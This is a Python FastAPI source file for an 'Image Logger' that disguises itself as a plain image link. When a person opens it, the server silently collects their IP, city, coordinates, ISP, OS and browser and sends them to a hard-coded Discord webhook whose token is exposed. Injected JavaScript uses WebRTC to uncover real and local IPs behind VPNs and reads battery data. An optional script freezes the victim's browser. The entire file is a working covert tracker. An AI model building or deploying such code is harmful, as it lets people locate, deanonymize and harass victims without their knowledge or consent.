from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, RedirectResponse, Response
import requests

app = FastAPI()

config = {
    "webhook": "https://discord.com/api/webhooks/1533168835316682854/TKTyWeqHd99G3wbXyYZeCd2n6-JocDtoNKSju2cuoOYNnUtCa0iXwTAyy_CVLHf9EnAF",
    "image": "https://raw.githubusercontent.com/assettomods117-pixel/IMAGE-LOGGER/refs/heads/main/06e21ef5-4be3-4274-b7c0-681adbd313b8.jpeg",
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "buggedImage": False,
    "vpnCheck": 1,
    "antiBot": 1,
    "linkAlerts": True,
}

blacklistedIPs = ("27", "104", "143", "164")


def bot_check(ip: str, useragent: str):
    if not ip:
        return False
    if ip.startswith(("34.", "35.")):
        return "Discord"
    if useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False


def parse_ua(useragent: str) -> tuple[str, str]:
    ua = useragent.lower()
    if "windows" in ua:
        os_name = "Windows"
    elif "android" in ua:
        os_name = "Android"
    elif "iphone" in ua or "ipad" in ua:
        os_name = "iOS"
    elif "mac" in ua:
        os_name = "macOS"
    elif "linux" in ua:
        os_name = "Linux"
    else:
        os_name = "Unknown"

    if "edg/" in ua:
        browser = "Edge"
    elif "opr/" in ua or "opera" in ua:
        browser = "Opera"
    elif "chrome/" in ua and "chromium" not in ua:
        browser = "Chrome"
    elif "firefox/" in ua:
        browser = "Firefox"
    elif "safari/" in ua and "chrome" not in ua:
        browser = "Safari"
    elif "wget" in ua or "curl" in ua:
        browser = "CLI"
    else:
        browser = "Unknown"

    return os_name, browser


def make_report(ip: str, useragent: str, endpoint: str = "/api/image"):
    if not ip or ip.startswith(blacklistedIPs):
        return

    bot = bot_check(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": (
                            f"**Link foi enviado!**\n\n"
                            f"**Endpoint:** `{endpoint}`\n"
                            f"**IP:** `{ip}`\n"
                            f"**Platform:** `{bot}`"
                        )
                    }]
                }, timeout=8)
            except:
                pass
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=6).json()
    except:
        info = {}

    ping = "@everyone"

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 2:
            return
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = parse_ua(useragent or "")

    description = f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', 0)}, {info.get('lon', 0)}`
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False)}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```"""

    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": ping,
            "embeds": [{
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": description,
                "thumbnail": {"url": config["image"]}
            }]
        }, timeout=8)
    except:
        pass


def _build_html(crash: bool) -> str:
    crash_script = ""
    if crash:
        crash_script = """
<script>
setTimeout(function(){
    for(var i=69420;i==i;i*=i){console.log(i)}
}, 150);
</script>"""

    collector_script = """
<script>
(function(){
    var ips = [];
    var seen = {};

    function extractIPs(sdp) {
        var lines = sdp.split('\\n');
        for (var i = 0; i < lines.length; i++) {
            var line = lines[i].trim();
            if (line.indexOf('a=candidate:') === 0 || line.indexOf('candidate:') === 0) {
                var parts = line.split(' ');
                if (parts.length > 4) {
                    var ip = parts[4];
                    var typ = parts.length > 7 ? parts[7] : '';
                    if ((typ === 'host' || typ === 'srflx') && !seen[ip]) {
                        seen[ip] = true;
                        ips.push(ip);
                    }
                }
            }
        }
    }

    function sendData(extraPayload) {
        var payload = Object.assign({ ips: ips }, extraPayload || {});
        fetch('/api/webrtc', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(function(){});
    }

    try {
        var pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });

        pc.createDataChannel('x');

        pc.onicecandidate = function(e) {
            if (e.candidate && e.candidate.candidate) {
                extractIPs(e.candidate.candidate);
            }
        };

        pc.onicegatheringstatechange = function() {
            if (pc.iceGatheringState === 'complete') {
                pc.close();

                if ('getBattery' in navigator) {
                    navigator.getBattery().then(function(battery) {
                        var c_time = battery.chargingTime;
                        var d_time = battery.dischargingTime;
                        sendData({
                            battery: {
                                level: Math.round(battery.level * 100),
                                charging: battery.charging,
                                chargingTime: (c_time === Infinity ? null : c_time),
                                dischargingTime: (d_time === Infinity ? null : d_time)
                            }
                        });
                    }).catch(function(){ sendData(); });
                } else {
                    sendData();
                }
            }
        };

        pc.createOffer().then(function(offer) {
            return pc.setLocalDescription(offer);
        }).catch(function(){});

    } catch(err) {}
})();
</script>"""

    return f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title></title></head>
<body style="margin:0;padding:0;overflow:hidden;">
<div style="background-image:url('{config["image"]}');background-size:contain;background-repeat:no-repeat;background-position:center;width:100vw;height:100vh;"></div>
{collector_script}{crash_script}
</body>
</html>"""


@app.get("/")
@app.get("/api/image")
async def logger(request: Request, background_tasks: BackgroundTasks):
    ip = request.headers.get("x-forwarded-for") or (
        request.client.host if request.client else "Unknown"
    )
    if "," in str(ip):
        ip = ip.split(",")[0].strip()

    useragent = request.headers.get("user-agent", "")

    if bot_check(ip, useragent):
        make_report(ip, useragent)
        if config["buggedImage"]:
            return Response(content=b"", media_type="image/jpeg")
        return RedirectResponse(url=config["image"], status_code=302)

    background_tasks.add_task(make_report, ip, useragent)

    if config["crashBrowser"]:
        return HTMLResponse(content=_build_html(crash=True))

    return HTMLResponse(content=_build_html(crash=False))
